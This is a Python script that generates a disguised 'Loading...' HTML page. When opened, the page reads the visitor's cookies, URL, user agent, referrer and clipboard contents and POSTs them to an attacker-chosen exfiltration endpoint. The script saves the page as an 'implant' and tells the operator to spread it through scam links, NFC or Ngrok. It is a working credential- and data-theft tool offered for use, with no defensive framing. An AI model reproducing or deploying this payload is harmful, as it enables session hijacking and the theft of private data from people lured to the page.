#!/usr/bin/env python3
# hijax_remote_implant.py
import os
import time

TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <script>
    async function exfiltrate() {{
      const data = {{
        url: window.location.href,
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        clipboard: ""
      }};

      try {{
        const text = await navigator.clipboard.readText();
        data.clipboard = text;
      }} catch (e) {{
        data.clipboard = "access_denied";
      }}

      fetch("{endpoint}", {{
        method: "POST",
        headers: {{
          "Content-Type": "application/json"
        }},
        body: JSON.stringify(data)
      }});
    }}
    window.onload = exfiltrate;
  </script>
</head>
<body>
  <h1 style="display:none;">Processing...</h1>
</body>
</html>
"""

def generate_payload():
    print("[*] Hijax Implant Generator")
    default_endpoint = "http://localhost:5000/capture"
    endpoint = input(f"Enter exfil URL [default: {default_endpoint}]: ").strip() or default_endpoint

    ts = str(int(time.time()))
    filename = f"implant_drop_{ts}.html"
    payload_dir = os.path.join(os.path.dirname(__file__), "payloads")
    os.makedirs(payload_dir, exist_ok=True)

    content = TEMPLATE.format(endpoint=endpoint)
    filepath = os.path.join(payload_dir, filename)

    with open(filepath, "w") as f:
        f.write(content)

    print(f"[+] Implant payload saved to: {filepath}")
    print("[!] Serve this using ScamTrack, NFC, or Ngrok link.")
    print(" To test: python3 -m http.server 8080 && open http://localhost:8080/payloads/" + filename)

if __name__ == "__main__":
    generate_payload()
